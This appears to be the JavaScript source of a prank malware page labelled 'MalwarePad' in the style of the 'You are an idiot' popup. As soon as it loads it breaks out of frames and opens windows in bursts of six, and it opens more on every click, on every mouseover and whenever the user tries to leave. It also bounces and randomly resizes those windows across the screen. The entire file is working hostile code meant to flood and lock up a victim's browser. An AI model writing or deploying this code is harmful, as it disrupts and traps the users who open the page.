/* * MalwarePad Logic + Random Resize & Spawn Chaos
 */

if (top.location != location) {
    top.location.href = location.href;
}

// 1. Random Spawning and Sizing
function reopen() {
    // Generate random width and height between 200px and 500px
    var w = Math.floor(Math.random() * 300) + 200;
    var h = Math.floor(Math.random() * 300) + 200;

    // Generate random spawn position within screen bounds
    var x = Math.floor(Math.random() * (screen.availWidth - w));
    var y = Math.floor(Math.random() * (screen.availHeight - h));

    var winName = "idiot_" + Math.random().toString(36).substring(7);
    var features = `width=${w},height=${h},left=${x},top=${y},menubar=no,status=no,toolbar=no,resizable=yes,scrollbars=yes`;
    
    var newWin = window.open(window.location.href, winName, features);
    
    if (newWin) {
        newWin.focus();
    }
}

function spam() {
    for (var i = 0; i < 6; i++) {
        reopen();
    }
}

// 2. Entry Point
function init() {
    document.body.onclick = reopen;
    document.body.onmouseover = reopen;
    
    window.onbeforeunload = spam;

    if (window.opener) {
        playBall();
    } else {
        spam();
    }
}

// 3. The Bouncing & Resizing Loop
var xOff = 5, yOff = 5, xPos = 400, yPos = 100;
var flagRun = true;

function newXlt() { xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; }
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; }
function newYup() { yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; }
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; }

function playBall() {
    // Current window size
    var winW = window.outerWidth;
    var winH = window.outerHeight;

    xPos += xOff;
    yPos += yOff;

    // Bounce logic
    if (xPos > (screen.availWidth - winW)) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > (screen.availHeight - winH)) newYup();
    if (yPos < 0) newYdn();

    if (flagRun) {
        window.moveTo(xPos, yPos);

        // RANDOM RESIZE LOGIC
        // Every ~50 frames, change the window size randomly
        if (Math.random() > 0.98) {
            var newW = Math.floor(Math.random() * 300) + 200;
            var newH = Math.floor(Math.random() * 300) + 200;
            window.resizeTo(newW, newH);
        }

        setTimeout(playBall, 15);
    }
}
